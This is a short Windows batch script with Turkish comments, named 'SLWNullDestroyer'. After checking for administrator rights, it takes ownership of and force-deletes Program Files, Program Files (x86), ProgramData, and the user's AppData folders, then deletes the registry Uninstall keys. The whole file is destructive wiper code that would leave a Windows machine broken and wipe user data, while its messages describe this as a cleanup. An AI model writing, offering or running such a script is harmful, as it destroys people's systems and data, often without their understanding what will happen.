@echo off
:: Tüm yüklü programlar ve kalıntılar siliniyor.
echo SLWNullDestroyer başlıyor... Tüm programlar ve kalıntılar siliniyor! 😈
echo.

:: Yönetici izni kontrolü
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Bu betiği yönetici olarak çalıştırmanız gerekiyor!
    pause
    exit
)

:: 1. Program Files içindeki her şeyi sil
echo Program Files ve Program Files (x86) klasörleri temizleniyor...
takeown /f "C:\Program Files" /r /d y >nul 2>&1
icacls "C:\Program Files" /grant %username%:F /t >nul 2>&1
rd /s /q "C:\Program Files"

takeown /f "C:\Program Files (x86)" /r /d y >nul 2>&1
icacls "C:\Program Files (x86)" /grant %username%:F /t >nul 2>&1
rd /s /q "C:\Program Files (x86)"

:: 2. Kayıt Defteri'nden programları kaldır
echo Kayıt Defteri girdileri temizleniyor...
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall" /f
reg delete "HKLM\Software" /v "ProgramFilesPath" /f

:: 3. Common Files temizliği
echo Common Files klasörü temizleniyor...
takeown /f "C:\ProgramData" /r /d y >nul 2>&1
icacls "C:\ProgramData" /grant %username%:F /t >nul 2>&1
rd /s /q "C:\ProgramData"

:: 4. AppData'daki kalıntıları temizleme
echo AppData klasörleri temizleniyor...
takeown /f "%localappdata%" /r /d y >nul 2>&1
icacls "%localappdata%" /grant %username%:F /t >nul 2>&1
rd /s /q "%localappdata%"

takeown /f "%appdata%" /r /d y >nul 2>&1
icacls "%appdata%" /grant %username%:F /t >nul 2>&1
rd /s /q "%appdata%"

:: 5. TEMP dosyalarını temizleme
echo Geçici dosyalar temizleniyor...
del /f /s /q "%temp%\*" >nul 2>&1

:: 6. Son mesaj
echo Tüm programlar ve kalıntılar başarıyla silindi. Sistem neredeyse sıfırlandı!
echo.
pause
